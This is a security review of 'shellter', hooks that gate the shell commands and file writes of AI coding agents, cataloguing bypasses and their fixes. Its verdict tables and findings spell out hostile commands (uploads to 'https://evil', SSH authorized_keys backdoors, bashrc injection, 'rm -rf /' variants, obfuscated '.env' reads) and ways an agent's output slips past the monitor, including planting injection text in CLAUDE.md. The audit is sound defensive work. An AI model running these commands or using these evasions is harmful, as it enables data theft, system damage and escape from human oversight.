# shellter — security review (2026-07-02)

Full-project audit of detection **correctness and effectiveness** at v0.5.4.
Two independent passes, merged here: a manual read of every hook, and a
25-agent high-effort review (4 finders + 19 verifiers + synthesis). Findings that
carry a verdict were run through the real `check-bash.js`/`check-sensitive-files.js`
over stdin — verdicts are observed, not inferred.

Files reviewed: `hooks/check-bash.js`, `hooks/check-sensitive-files.js`,
`hooks/scan-content.js`, `hooks/shellter-trust.js`, `hooks/hooks.json`,
`settings-template.json`, `merge-settings.js`, `adapters/shared/shellter-host-hook.js`.

## Status — RESOLVED in v0.6.0 (2026-07-02)

Every finding below (A1-A9, B1-B3, C1, D1-D3) was fixed and is guarded by a
regression test. Suite: **439 passed, 0 failed**. Each fix was re-verified against
the live hook (deny/ask fires, benign twin still approves). See the CHANGELOG
`[0.6.0]` entry for the per-fix summary. D4 (single-layer decode) and D5 (README
drift) are documentation items; D5 is fixed, D4 is a documented, accepted limit.
The sections below are the original audit, retained as the record of what was found.

## Second-axis review — false positives + residual bypasses (v0.7.0, 2026-07-04)

Every audit up to v0.6.0 pushed one direction: block more. This pass checked the opposite
axis — is shellter now over-blocking safe commands? — and the low-risk correctness gaps that
axis surfaced. All findings verified against the live hooks; fixes shipped in v0.7.0 with
benign-twin + attack-shape regression tests (suite 526 passing). See the CHANGELOG `[0.7.0]`
entry for the per-workstream summary. The big FP class was injection-on-write hard-denying
ordinary content (security docs, test fixtures, chatbot prompts, transcripts, `<system>`
markup) — now gated to agent-instruction files or exfil-carrying payloads.

### Accepted limits (known, deliberately not fixed)

These were considered and left as documented gaps because the fix would either reintroduce
false positives or add fragile complexity out of proportion to the risk:

- ~~**Cross-segment variable indirection**~~ — **FIXED in 0.8.0, and it was worse than this
  entry claimed.** `X=.env; cat $X` did not "evade the matchers" into a fallthrough; it
  returned `allow` with no prompt, because `cat $X` matched a plain-read approve rule. The
  `VAR=literal` pre-pass described here is what shipped, plus an approve floor for the
  unresolvable case. The feared FPs did not materialise: expansion only fires where a read
  verb meets a secret token, which is precisely the attack, and the suite stays green.
  `X=rm; $X -rf /` is covered by the same change: the deny tables accept predicate matchers,
  and `rmDanger` is evaluated over the expanded variant like every other rule.
- ~~**Subshell scoping is not modelled**~~ — **FIXED during the second 0.8.0 review round.**
  An assignment is now only carried into later segments when the segment is assignments and
  nothing else, so a subshell (`( X=.env ); cat $X`) and a command prefix
  (`X=.env cat notes.txt; cat $X`) no longer leak — while a brace group, which does run in
  the current shell, still does (`{ X=.env; cat $X; }` denies). The rule this round
  established and applied throughout: prefer `ask` over a hard deny when the analysis is
  uncertain, because a deny cannot be overridden in-session.
- ~~**PowerShell variable indirection is not expanded**~~ - **FIXED.**
  `$X = ".env"; Get-Content $X` now denies. PS assignments are collected with their own
  pattern (`$NAME = value`), names folded to lower case since PowerShell is
  case-insensitive, and a backtick treated as the in-string escape. PS has no env-prefix
  form, so an assignment anywhere in the segment persists. A value containing a dollar sign
  or a backtick is still treated as computed and never expanded.
- **Non-shell interpreter one-liners with a non-secret destructive payload** —
  `node -e "require('child_process').execSync('rm -rf /')"`, `perl -e 'system("…")'`. Scanning
  arbitrary JS/Perl/Ruby for destruction false-positives on legit code (dynamic-eval idioms,
  bundles); these interpreters are removed from blanket auto-approve (→ prompt) instead.
- **Public `.pem` / `.key` still read as a secret** — a private key and a public cert chain
  share the extension, so reading `fullchain.pem` is still denied. `.crt` (unambiguously public)
  was dropped; `.pem`/`.key` stay conservative to avoid missing a private key.
- **Double base64 / hex decoding (D4)** — the content scanner decodes one layer; a payload
  encoded twice evades the decoded-layer scan.

## Third review - structural approve (v0.11.0, 2026-11-17)

Two independent reviews of v0.10.0: the command hook (B-*) and the file hook, trust store,
scanner and adapters (F-*). Every finding was reproduced against the live hooks over stdin, and
every fix ships with an attack test and a benign twin. The root cause behind most of the B-C
findings was one design flaw: the approve pass matched the first word of a segment, not what the
segment runs. It now recurses instead (env prefix, wrapper, keyword, `&`, substitution, `trap`,
`find -exec`, `xargs`, PowerShell blocks all reduce to "does the inner command approve?"), which
closes the holes without prompting on `X=1 npm test` or `timeout 30 npm test`. A committed
prompt-rate corpus in `test-hooks.js` and `scripts/replay-corpus.js` (a replay of a real decision
log against the previous release) gate every change on not adding prompts.

| Finding | v0.10.0 | v0.11.0 |
| --- | --- | --- |
| B-C1 heredoc fast path approves an unvalidated `cat` preface | allow | deny / exact preface only |
| B-C2 python heredoc validator is a keyword blacklist | allow | fallthrough (validator removed) |
| B-C3 env prefix approves the whole command | allow | fallthrough unless the command approves |
| B-C4 single `&` is not a separator | allow | split; each command checked |
| B-C5 `$( )`, backticks, `<( )`, `>( )` never inspected | allow | deny-checked and must approve |
| B-C6 shell keywords approve what follows | allow | the body must approve |
| B-C7 quoted `find` primaries | allow | primaries read from tokens |
| B-C8 approve-listed tools that execute arguments (awk, sed, tar, git, fd, rg, tmux, screen) | allow | no approve on exec options |
| B-C9 PowerShell verb-prefix approve | allow | structural: every stage and group body |
| B-H1 exponential assignment regex | 30 s+ hang | linear scan |
| B-H2 secret reads via glob, backslash, `$'x'` | allow | deny |
| B-H3 secret reads via `sort`, `diff`, input redirect, `ln`, `git diff --no-index`, `curl file://` | allow | deny |
| B-H4 `curl --json @`, bundled `-sT`, `wget --body-file` uploads | allow | deny (secret) / ask (any file) |
| B-H5 `xargs` flag arity | allow | unknown flag: no approve |
| B-H6 heredoc trailing commands skip the ask tier | allow | full pipeline |
| B-M1 polynomial rules on a long comment | slow | bounded |
| B-M2 escaped / globbed `rm`, nested `sh -c`, grouped pipe to a shell, `git config set` | fallthrough | deny |
| B-M3 `bun x <pkg>`, `go run host/mod@v`, `~/.kube/config`, gh `hosts.yml`, `/proc/self/environ` | allow | fallthrough / deny |
| F-C1 `:*` rule matched against the whole compound command | allow | segment only |
| F-C2 Windows backslash paths | fallthrough | deny |
| F-H1 repo-committed `settings.local.json` | allow | inside a git checkout: ignored when git reports it tracked, in any letter case, and when git cannot answer. Outside any checkout: honoured (the user's own `~/.claude`) |
| F-H2 agent writes its own trust / hooks / relative `SHELLTER_TRUST_FILE` | fallthrough / allow | deny for the trust store, installed shellter hook files, the plugin cache subtree and any write to the `package.json` beside the hooks (the hooks create it as CommonJS when missing, so a parent `package.json` is irrelevant); `SHELLTER_TRUST_FILE` inside any git checkout ignored. Settings edits are ask-only, silent in bypass and auto mode |
| F-H3 Grep `glob`, token-shape regexes | fallthrough | deny for explicit secret-name globs; token shapes only over a broad path. Adapters pass include globs through |
| F-H4 adapter write tools unscanned | allow | scanned (best-effort shapes) |
| F-H5 adapters time out on 300 KB comment padding | fail open | linear comment scan, 25 s adapter timeout; since the fifth review a hook that does not finish within its budget answers ask (deny in bypass / auto) |
| F-H6 installer with a space in the home path | fail open | quoted |
| F-M1 junction / `::$DATA` / other hosts' instruction files | fallthrough | deny |
| F-M2 invisible format characters, Markdown emphasis | fallthrough | deny on instruction files: default-ignorable code points, combining marks and the braille blank are stripped by class; HTML tags and link wrappers seen through |
| F-M3 false hard-denies on ordinary content | deny | fallthrough / ask |
| F-M4 `shellter scan` blind spots | no findings | reported |
| F-M5 decode budget exhausted by 8 decoys | fallthrough | 64 tokens; exhaustion asks on instruction files |
| F-M6 secret-path list gaps | fallthrough | deny (history / `.claude.json` ask) |
| F-L1 dead `data:text/html` branch | fallthrough | deny in rendered docs |
| F-L2 installer BOM / non-object settings | data loss | BOM accepted, non-object aborts |
| F-L3 stale bun adapter tests | red | green |
| F-L4 dead `permissions` line | present | removed |

The recursion described above was the round-1 design. Round 2 (below) replaced it with one parser.

## Fourth review - fail-closed approve (v0.11.0, 2026-11-18)

Two reviews of the round-1 fixes found that the approve path still held six independent models of
bash (chain split, pipe split, substitution extractor, heredoc view, tokenizer, keyword regexes);
every new bypass was a place where two of them disagreed. The approve side is now one strict parser
(`parseBash`) and one walker. A command the parser does not fully read is never auto-approved; the
raw deny passes still run on everything, so deny coverage does not depend on the parser. Parse and
walk failures of any kind, more than 64 nesting levels and more than 4,096 words all mean "unparsed".
Every finding below is pinned in `test-hooks.js` with a benign twin, and the reviewers' probe files
are part of the suite (`test-probes.js`).

| Finding | v0.11.0 round 1 | v0.11.0 |
| --- | --- | --- |
| N1 xargs with a quoted or pathed command word | allow | fallthrough |
| N2 heredoc view blanks real command lines | allow | fallthrough |
| N3 `((` assumed arithmetic | allow | fallthrough |
| N4 `for` / `select` approve unread | allow | fallthrough |
| N5 `node --check` with a preload | allow | fallthrough |
| N6 `gh api` attached short flags | allow | fallthrough |
| N7 heredoc `tee` target lost | allow | ask |
| N8 PowerShell here-string quote parity | allow | fallthrough |
| H-1 `fi` / `done` prefix approves | allow | fallthrough |
| H-2 a quote inside a `#` comment | ask | deny |
| H-3 PowerShell name prefix match | allow | fallthrough |
| H-4 PowerShell member-name invocation | allow | fallthrough |
| H-5 sed walker (value-taking flag) | allow | fallthrough |
| H-6 awk walker | allow | fallthrough |
| H-7 env prefix behind `time` | allow | fallthrough |
| H-8 exec-flag gaps (git `ext::`, `fetch -u`, tar `I`, `less +`) | allow | fallthrough |
| H-9 secret read via a loop variable, attached redirect, `$'\x..'` | fallthrough / allow | deny |
| H-10 curl header from a secret file | fallthrough | fallthrough (accepted, see below) |
| H-11 cubic `sed -i` rule (27 KB) | hang | bounded, class timing test |
| H-12 `-n` as a value flag for every verb | allow | scoped to `head`/`tail`/`grep`/`rg` |
| M-1 download rule weakened by `&` in a URL | fallthrough | deny restored |
| M-2 trust-store basename match on fixtures | deny | fallthrough (resolved path compared) |
| M-3 flagged script behind a pipe, `$( )`, `if` | fallthrough | ask |
| M-4 heredoc fast path writes `.git/`, `.husky/`, `.claude/settings*.json` | allow | fallthrough / ask |
| F M-2 Glob `**/*credential*`, `**/*id*` | deny | fallthrough; literal secret stems still deny |
| F M-4 path lists exhausting the decode budget | ask | fallthrough |
| F M-9 quoted override phrase in `SKILL.md` | deny | ask on instruction files (a quote is one character, so it cannot exempt there); advisory elsewhere |

Measured on the maintainer's command log (5,389 unique commands) against 0d49eac: 56 benign
auto-approvals (1.7%) now prompt, all in named classes (env prefix, loop or if body, wrapper, python
heredoc, invalid sed, `${x%%pat}`, unresolved substitution); 346 rows that prompted now approve; no
benign command went to deny. Against round 1: 10 allow -> fallthrough, all attack probes or accepted
classes.

### Accepted limits (v0.11.0)

- **An unparsed command is never auto-approved, and in bypass mode it runs.** `((..))`, `for ((..))`,
  functions, `select`, `coproc`, PowerShell here-strings, `${ }` and block comments are not modelled.
  Self-protection against an unmodelled command (`node -e` writing the hooks dir) is not a sandbox.
- **Arithmetic over file content** (`x=$(cat f); echo $((x+1))`, `read -r n < f; echo $((n+1))`)
  prompts: bash evaluates the value as an expression; only producers that print digits are trusted.
- **A standalone `IFS=..`** prompts: it changes how every later bare expansion splits.
- **An unread value as an argument of an exec-capable command** (`gh api ../$id` with the id from an
  unread `--jq`, `git -C $P` with `P` from `read`) prompts.
- **A cloned directory with no `.git`** (zip, tarball, template copy) honours its `settings.local.json`:
  there is no index to ask.
- **CR in a command** (CRLF line ends) prompts; the parser refuses every CR.
- **Derived-name and recursive reads.** A name produced by `find`, `ls`, `grep -l`, `git ls-files`
  counts as resolved for the approve floor, and `grep -r` / `--include` over a tree is allowed: the
  same reach as recursive content search, which is the tool's purpose.
- **Glob forms that are not a literal secret stem or prefix** (`*env`, `**/*nv`, `**/?env`, `**/.e*v`,
  `**/id_*`, `**/*.pe?`, `*ssh/*`, `**/.s*/id*`) in Grep and Glob fall through: any rule that catches
  them re-creates the false denies.
- **One-character regex evasions** of the token-shape Grep rule (`AK[I]A`): it is a tripwire for mass
  harvesting, not a boundary.
- **Write-then-run chains** (a heredoc `package.json` then `npm test`): project-trust model.
- **`cp /dev/stdin <dest> <<EOF`, `sort -o`** to destinations other than rc files, Claude settings and
  shellter's own files: general write-target classification is deferred.
- **`time X=v cmd`, and an app variable in prefix form before a read-only tool** fall through.
- **PowerShell has no full parser.** `poshScan` rejects what it does not model.

- **Code runners** (`tsx x.ts`, `ts-node`, `bun run`, `uv run`, `java -jar`, `pnpm exec`) still
  auto-approve: they run project code, the same trust as `npm run`. Only the remote-fetch forms
  (`bun x <pkg>`, `go run host/mod@version`) were closed.
- **Destructive or persistent writes** that no rule names (`chmod -R 000 ~`, `mv ~/Documents /tmp`,
  `git switch -f`, `echo x > ~/.config/autostart/...`) still auto-approve. Only shell rc files and
  Claude Code settings (ask) and shellter's own files (deny) are classified as write targets.
- **`PATH=` over system or home directories and app variables before a project-code runner** stay
  approvable: `export PATH="$HOME/.cargo/bin:$PATH" && cargo build` is everywhere. Loaders
  (`LD_*`, `DYLD_*`, `BASH_ENV`, `HOME`, ...) never approve.
- **A secret env var in a header or URL** (`curl -H "Authorization: Bearer $GITHUB_TOKEN" ...`) is
  indistinguishable from every authenticated API call.
- **`cp $X out.txt` with an unresolved `$X`** stays approvable: copying is not disclosure.
- **sed / awk scripts whose shell variable carries code at runtime** do not approve: an unresolved
  expansion in a sed script may only stand for a line number, and an awk program must be literal.
- **Heredoc bodies of `cat`/`tee`** are still deny-scanned as pseudo-commands (a known false-prompt
  source); relaxing a deny pass does not belong in a security-fix release.
- **WebFetch / WebSearch** are not gated: exfiltration needs a secret already read, which the gated
  tools cover.
- **MCP tools (`mcp__*`) are a known bypass.** A filesystem or shell MCP server reads and runs what
  it is asked; shellter does not know its tool shapes, and a generic sniff would false-deny.
- **A hook that cannot finish** within `SHELLTER_BUDGET_MS` (at most 8 s; one retry under 16 KB) asks in
  default, acceptEdits and plan mode and denies in bypassPermissions and auto mode (`TIMEOUT_DECISION` in
  `hooks/watchdog.js`), unless the user's own allow rule or trust store covers the whole command: that
  falls through. `test-perf.js` keeps the known paddings far under that budget. Adapters time out after
  25 s, above the watchdog's worst case; agy asks then, the others fail open. The file hook's timeout
  has no allow override. A patch blob runs one hook per target in turn, so a blob of many targets can
  still exceed codex's 30 s.
- **`ls` / `list` on `~/.ssh`** through the opencode and pi adapters: filenames only.
- **Host tool shapes** for codex / agy / opencode patch and multi-edit tools are best-effort; only
  the adapter side is verified.
- **Triple encoding, and codex treating `ask` as silent**: unchanged, documented above.
- **`tmux send-keys`, git commit hooks, `npm run` scripts**: project-trust model.

## Fifth review - bounded time, bash's words (v0.11.0, 2026-11-18)

Two reviews of round 2 found six root causes: no bound on analysis time, the parser's words not being
bash's words, unread arguments treated as ordinary, four definitions of "sets a variable" and of
"integer", a second decision path beside the parser (the heredoc fast path), and caps that failed
open. Each is fixed once, where every caller routes through. A differential fuzz
(`test-parser-fuzz.js`) and a performance gate (`test-perf.js`) now run in `npm test` and CI.

| Finding | v0.11.0 round 2 | v0.11.0 |
| --- | --- | --- |
| B F1 `${x:-{}` ends at the first `}` | allow | fallthrough |
| B F2 heredoc fast path approves before any deny pass (critical) | allow | the heredoc goes through the parser; fallthrough / deny |
| B F3 exec flags through word splitting, brace expansion, NUL, `$( )` arguments, `xargs find` | allow | fallthrough |
| B F4 sed line-number placeholder that is not an integer | allow | fallthrough |
| B F5 arithmetic in heredoc bodies, `trap`, `bash -c`, `[[ -v ]]`, name positions, `declare -i/-n` | allow | fallthrough |
| B F6 `PATH` set by `for`, `read`, `printf -v`, `${:=}`; `hash -p` | allow | fallthrough |
| B F7 backslash CR LF (Linux bash) | allow | fallthrough (any CR) |
| B F8 `test/x.sh`, `echo-x`, `ls.bat` matched as `test`, `echo`, `ls` | allow | fallthrough |
| B F9 PowerShell `$var.Method()` in argument mode; quote mis-pairing | allow | fallthrough |
| B D1 / F H-1 / F H-4 quadratic scans: no answer | fail open | worker-thread watchdog; perf gate |
| B P1 21 everyday commands lost their allow | fallthrough | allow (19); 2 accepted (file-content arithmetic) |
| B R1 name producers that print text (`find -printf`, `grep -o`) | allow | fallthrough |
| B R2 `${x:=.env}`, `printf -vx` stale values | allow | fallthrough |
| B R3 `cat < .e*` | allow | fallthrough |
| B R4 protected path as an argument; unresolved write target | allow / fallthrough | fallthrough / deny |
| F H-2 50-match cap on quoted phrases | fallthrough | deny |
| F H-3 any write to the hooks' `package.json` switches both hooks off | fallthrough | deny; the hooks pin it |
| F M-1 `settings.local.json` shipped as `CLAUDE~1/` | allow | not honoured (ask) |
| F M-2 shim: `+++` inside a `***` blob, `paths` hides `path` | allow | deny |
| F M-3 opencode patch shapes | allowed | blocked (one parser, `hooks/patch-targets.js`) |
| F M-5 literal prefix plus one `*` (`.en*`, `id_r*`) | fallthrough | deny |
| F L-4 agent worktree source scanned as an instruction surface | deny | fallthrough |
| CR1 a bracket class over 512 characters made the glob unreadable: read as "no secret" | allow | deny |
| CR2 `cd ~/.claude/hooks && tar xf x.tar`: a cd hid the protected directory | allow | fallthrough |
| CR3 `git -C <shellter checkout> pull`: git counted as a plain reader | allow | fallthrough (reading subcommands still allow) |
| CR4 a name unknown before `if false; then X=a; fi` read as `a` after it | allow | fallthrough |
| CR5 patch: a ` *** ` context line hid later `+++` headers; `+++ "b/.env"` kept its quotes | allow | deny |
| CR6 Glob `.git*` denied as a prefix of `.git-credentials` | deny | fallthrough |
| CR7 emphasis runs of 5+ markers inside an override phrase | fallthrough | deny |
| CR8 trust check listed the whole index (1 MB, 2 s): big repos lost their local rules | rules ignored | honoured (two levels listed, 16 MB) |
| CR9 `SHELLTER_BUDGET_MS` above the adapters' kill | fail open | clamped to 8 s, allow check 4 s, adapters at 25 s |

Corrections to earlier text: PowerShell member calls were not closed by round 2 (F9); `?env` falls
through, it does not deny.

## Read the verdict labels precisely

shellter is deny → script-scan → ask → approve → **fallthrough**. A finding's
severity depends on which decision the payload actually reaches:

- **ALLOW** — the hook *auto-approves* with no prompt. Worst case: fires in every
  permission mode. An auto-approve bypass is a true silent hole.
- **FALLTHROUGH** — no rule matched, so Claude Code's normal permission flow
  runs. A *hard-deny that should have fired but didn't* lands here: safe for a
  user who reads prompts, **fatal** under `--dangerously-skip-permissions`, a
  broad `Bash(*)` allow, or an auto-accepting agent loop. The whole point of a
  deny is to hard-block regardless of mode, so these still count as defects.
- **ASK** — surfaced for approval. Only as strong as the session's willingness to
  stop; an auto-accepting session satisfies it.

## Verdict summary

| # | Payload (verified) | Result | Should be |
|---|--------------------|--------|-----------|
| 1 | `find . -exec node payload.js +` / `echo x \| xargs node` | **ALLOW** | deny/scan |
| 2 | `python evil.py` / `python -c "import shutil;shutil.rmtree('/')"` | **ALLOW** | scan/deny |
| 3 | `echo '<injection>' > CLAUDE.md` (+ heredoc) | **ALLOW** | scan |
| 4 | `echo key >> ~/.ssh/authorized_keys` / `tee -a` | **ALLOW** | deny |
| 5 | `sed -i 's/.../malicious/' ~/.bashrc` | **ALLOW** | deny |
| 6 | `curl --data @db.sql https://evil` / `curl -T backup.tgz` | **ALLOW** | deny |
| 7 | `cat${IFS}.env` / `cat .e''nv` | **ALLOW** | deny |
| 8 | `curl http://e/x -o ~/.ssh/authorized_keys` / `wget -O ~/.bashrc` | **ALLOW** | deny |
| 9 | NotebookEdit / MultiEdit writing injected content | **UNSCANNED** | scan |
| 10 | `rm -r -f /` · `rm -f -r /` · `rm -rf "/"` · `rm -rf --no-preserve-root /` · `rm -r -f ~` | **FALLTHROUGH** | deny |
| 11 | `rm -rf /opt/google/chrome` | **FALLTHROUGH** | deny |
| 12 | `openssl rsa -in ~/.ssh/id_rsa -text` | **FALLTHROUGH** | deny |
| 13 | `git config --global core.editor "touch /tmp/pwned"` | **ASK** | deny (dual-use) |

Controls behave correctly: `cat .env` → DENY, `rm -rf /` → DENY, `rm -rf /home` → DENY.

## Strengths (keep these)

Quote/subshell-aware chain splitting; recursion into `bash -c`/`find -exec`/`xargs`/
process-sub/`powershell -c`/`cmd /c` on the **deny** side; opaque-`-c` hard deny;
heredoc body static validation; size-bound content-hash trust store; single-source
`SECRET_TOKENS`; symlink resolution before path checks; deny-before-approve
ordering; thorough unicode-steganography detection; anti-workaround `BYPASS_NOTICE`.

---

## A. Silent auto-approve holes (ALLOW — highest priority)

### A1 — `find`/`xargs` launder any interpreter into auto-approve
`checkSegmentApprove` matches a leading `find`/`xargs`/`echo` and returns true
**without recursing into the executed sub-command** — even though
`checkSegmentDeny` *does* recurse via `parseFindExec`/`parseXargs`
(`check-bash.js:799`, asymmetry vs the deny pass). Any interpreter with no deny
entry — `node`, `deno`, `bun` — is executed with zero inspection.
Verified ALLOW: `find . -maxdepth 0 -exec node payload.js +`, `echo payload.js | xargs node`, `find . -exec deno run payload.ts +`.
Fix: make the approve pass recurse into `find -exec`/`xargs` children (reuse the
existing parsers) and only approve if every child approves; or drop `find`/`xargs`
from the blanket approve list.

### A2 — `python` blanket-approved; interpreted scripts never content-scanned
`/^\s*python[23]?\s/` (`check-bash.js:821`) approves *any* python. `detectScriptExec`
only recognizes bash-family + `.ps1` (`SH` at `:1192`, arms at `:1207-1239`), so
`python evil.py` / `ruby x.rb` / `node x.js` / `perl x.pl` run **unscanned**, and
the `python -c` deny (`:524`) lists only `socket|pty.spawn|subprocess|os.system|os.popen|os.exec|os.spawn|__import__|importlib|eval(|exec(` — it omits `os.remove`/`os.unlink`/`shutil.rmtree`/`ctypes`.
Verified ALLOW: `python3 evil.py`, `python3 -c "import shutil;shutil.rmtree('/x')"`, `import os;os.remove(...)`, `import ctypes;ctypes.CDLL(None)`.
The heredoc validator (`isSafePythonHeredocBody`, `:951-984`) already knows the
correct dangerous set — the `-c` deny and the (missing) script scan are far weaker.
Fix: drop the blanket `python` approve (keep the `-m pytest/ruff/...` forms at
`:823-824`); route bare `python -c`/`python -` to fallthrough; extend
`detectScriptExec` + `checkSegmentScript` to scan python/ruby/node/perl/php script
bodies through `scan-content`, as it already does for shell scripts.

### A3 — shell write-redirect / heredoc bypasses the injection scanner
Injection scanning lives only in `check-sensitive-files.js`, gated
`if (tool === 'Write' || tool === 'Edit')` (`:192`). Content written through the
Bash channel — `echo '...' > f`, `printf`, `tee`, or a `cat`/`tee` heredoc
approved by `isSafeHeredocInvocation` (`check-bash.js:1026`) — is auto-approved and
**never scanned**. So the exact prompt-injection text the Write tool DENYS
(`check-sensitive-files.js:212-251`) is plantable via `echo`. Verified ALLOW:
`echo hello > CLAUDE.md` (proves the path auto-approves with no content scan).
This defeats the README's advertised "detects prompt injection in written
content" for the shell path, and the planted file poisons the next agent to read it.
Fix: run `scan.scanInjection` on the resolved write target's content in the Bash
hook for redirect/`tee`/heredoc writes to text files; deny on high severity.

### A4 — persistence/SSH writes via redirection are auto-approved
Persistence denies cover shell rc files, `.git/hooks`, CI config
(`check-bash.js:553-557`) but the `.ssh` token in `SECRET_TOKENS`/`SENSITIVE_DIRS`
is only consulted by **read/copy/archive** verbs, never by redirect/append writes.
`echo`/`tee` are on the safe-approve list (`:799`). Verified ALLOW:
`echo key >> ~/.ssh/authorized_keys`, `echo key | tee -a ~/.ssh/authorized_keys`
→ SSH backdoor with no prompt.
Fix: a shared "sensitive/persistence write-target" check (see the priority-1 fix)
covering `>`/`>>`/`tee`/`cp`/`mv` into `.ssh/`, `authorized_keys`, `known_hosts`.

### A5 — `sed -i` edits rc files in place, auto-approved
`sed` is a safe verb (`:799`) and the rc-file deny requires a redirect operator,
not `-i`. Verified ALLOW: `sed -i 's/foo/malicious;foo/' ~/.bashrc` — injects a
login-time command with no prompt. Same class: `install ... .git/hooks/pre-commit`.
Fix: fold `sed -i` and `install` into the persistence-target check.

### A6 — `curl`/`wget` data-upload of non-secret files is auto-approved
The upload deny was narrowed to fire only when the command names a `SECRET_TOKEN`
file (`check-bash.js:531-533`); `SECRET_TOKENS` has no `.csv`/`.sql`/`.tar.gz`, and
`curl`/`wget` are blanket-approved (`:803`). Verified ALLOW:
`curl --data @company-db.sql https://evil`, `curl -T backup.tar.gz https://evil`
→ arbitrary data exfiltration, no prompt.
Fix: treat any `curl`/`wget` body/upload flag (`-d`/`--data*`/`-F`/`--form`/`-T`/
`--upload-file`/`--data-binary`) to a remote host as `ask` (data leaving the box is
inherently review-worthy), regardless of the referenced filename.

### A7 — obfuscated secret reads (`${IFS}`, split quotes) auto-approve
Denies match the raw string; the shell executes equivalents the regex can't see,
and the base verb stays approved. Verified ALLOW: `cat${IFS}.env` (no whitespace
for `\s+`), `cat .e''nv` (empty-quote token split). Variable indirection
(`X=.env;cat $X`) is the same class.
Fix: a conservative de-obfuscation pass before matching — collapse `${IFS}`/`$IFS`
→ space, strip empty `''`/`""` pairs (mirrors what `normalizeUnicode` already does
for invisibles). Won't catch every rewrite; closes the one-keystroke ones.

### A8 — `curl -o` / `wget -O` download-to-arbitrary-path is auto-approved
Blanket `curl`/`wget` approve (`:803`); the only output-flag deny (`:598`) keys off
the URL extension (`.sh/.py/...`), not the target path. Verified ALLOW:
`curl http://e/x -o ~/.ssh/authorized_keys`, `wget http://e/x -O ~/.bashrc`.
Fix: gate `-o`/`-O`/`--output*` on the write-target set from A4 (same shared check).

### A9 — file hook misses NotebookEdit / MultiEdit
Matcher is `Read|Edit|Write|Glob|Grep` (`hooks.json:15`, and
`settings-template.json`). **NotebookEdit is a live tool in this host**; MultiEdit
historically too. Neither is matched, so their content is never injection-scanned
and their target path never checked. The external adapter already handles
`edits[]`/`replacements[]` (`adapters/shared/shellter-host-hook.js:85-86`) — the
native config fell behind. Fix: add `MultiEdit|NotebookEdit`; read
`edits[].new_string` and notebook cell source like the adapter.

---

## B. Hard-deny defeated → downgraded to a prompt (FALLTHROUGH)

### B1 — the `rm -rf /` guard is bypassable
`check-bash.js:643` (system dirs) and `:654` (home) require `r` **and** `f` in one
combined flag token followed immediately by an unquoted literal target. Verified
FALLTHROUGH (deny does **not** fire): `rm -r -f /`, `rm -f -r /`,
`rm -rf --no-preserve-root /`, `rm -rf "/"`, `rm -rf '/'`, `rm -r -f ~`. `rm` isn't
in the approve list, so these fall to the normal prompt — a wipe under any
auto-approve setup. This is the flagship guard; it should be the hardest.
Fix: match `rm` with `-r`/`--recursive` and `-f`/`--force` as **separate or
combined** flags in any order; strip surrounding quotes from the target before the
path test; ignore known flags (`--no-preserve-root`) when locating the target.

### B2 — `/opt` deep-subtree deletion no longer denied
`/opt` was pulled from the any-depth system-dir list (`:644`); the replacement
(`:652`) guards only the `/opt` root and `..`-traversal. Verified FALLTHROUGH:
`rm -rf /opt/google/chrome`, `rm -rf /opt/google/*` — deletes installed software.
(Context: this tree lives under `/opt/projs`, so deep-`/opt` rm is intentionally
allowed for project cleanup — but "any deep path under /opt" is broad. Consider
scoping the allowance to the project root rather than all of `/opt`.)

### B3 — `openssl` can dump a private key un-denied
`openssl` was dropped from `READ_VERBS` (`:504`, with a comment calling it niche).
Verified FALLTHROUGH: `openssl rsa -in ~/.ssh/id_rsa -text` (also `pkey`/`ec -in`)
prints key material and no deny fires. Fix: add
`openssl\s+(rsa|pkey|ec|dsa|pkcs8|pkcs12)\b.*-in\b` to the sensitive-read denies,
or restore `openssl` to `READ_VERBS`.

## C. Downgraded to ASK (dual-use judgment call)

### C1 — git RCE-config keys are `ask`, not `deny`
`core.editor`/`core.pager`/`sequence.editor`/`diff.external`/`gpg.program`
(`check-bash.js:581-582`) let git run an arbitrary program on the next
commit/rebase. Verified ASK: `git config --global core.editor "touch /tmp/pwned"`.
The code comment argues these are legit dev config, which is fair — but an
auto-accepting session turns `ask` into RCE. Consider: hard-deny when the value
contains a shell metacharacter / `sh -c` / `&&` / `;` / `|`, `ask` otherwise.

---

## D. Cross-cutting / architecture

- **D1 — project-local allow rules suppress shellter's own malware flag.**
  `shellter-trust.commandAllowed` reads `.claude/settings.local.json` up 40 dirs
  (`shellter-trust.js:120-134`) and uses them to silence the risky-script flag
  (`check-bash.js:1309`). Those files are inside the repo — attacker-controllable
  in the exact "cloned repo ships malware" threat the scanner defends. Fix: honor
  only user-level `~/.claude/settings.json` for script-flag suppression.
- **D2 — fail-open has no floor; manual install widens the blast radius.**
  **Mostly fixed in 0.8.0.** The blanket `allow:[Read(*),Edit(*),Write(*),Glob(*),Grep(*)]`
  is gone from `settings-template.json`, and `merge-settings.js` no longer replaces the
  user's `permissions` at all (it used to overwrite the whole allow list). Unparseable or
  partially-analyzed input now degrades to `ask` via the coverage gate rather than
  falling through. The install-time node-on-PATH check was already present
  (`merge-settings.js:88-95`), and the README now states the fail-open behaviour
  explicitly. **Still open:** a missing `node` at hook-exec time is unfixable from
  inside a hook that cannot run — that is a property of the host, not of shellter.
- **D3 — written-content scan is unbounded.** **Accepted, measured — do not "fix" this.**
  Benchmarked at ~150 ms/MB, linear, with no backtracking blowup: 1 MB 137 ms, 4 MB 654 ms,
  10 MB 1478 ms, and 5 MB of adversarial low-entropy base64-shaped tokens (the pathological
  case for `decodeOneLayer`'s entropy gate) 628 ms. Capping would trade a latency problem
  that does not exist for a real blind spot past the cutoff, exactly as the code comment at
  `check-sensitive-files.js:203-206` argues. The per-call cost is dominated by node process
  startup (~510 ms on Windows) regardless.
- **D4 — single-layer decode.** **FIXED in 0.8.0.** `decodeLayers` runs two rounds of
  `decodeOneLayer` sharing ONE token budget, so a double-encoded payload is now decoded
  while the worst-case work is unchanged and it is still not a decode bomb. Three layers
  remains out of scope; each extra round buys a rarer payload for the same budget split
  more thinly, and the marker/NFKC views cover the obfuscation an attacker would more
  plausibly reach for next.
- **D5 — README version/claim drift.** `README.md:205` says
  "Current: 0.6.0 — HTML-comment FP fix + self-exemption for shellter's own
  source" while badge/manifests/CHANGELOG are 0.5.4 and the self-exemption was
  **reverted** (it was a confirmed security regression). Leaving docs that imply
  the exemption exists is dangerous. Fix: correct README:205 to 0.5.4, drop the
  self-exemption mention.

## E. Verified NON-issues (do not "fix" these)

Independent verification refuted these — they are intentional:
- git **identity** keys (`user.name`/`email`/`signingkey`) excluded on purpose
  (`check-bash.js:574-575`, supports the `ghc.bat` workflow). Only code-exec keys
  are gated.
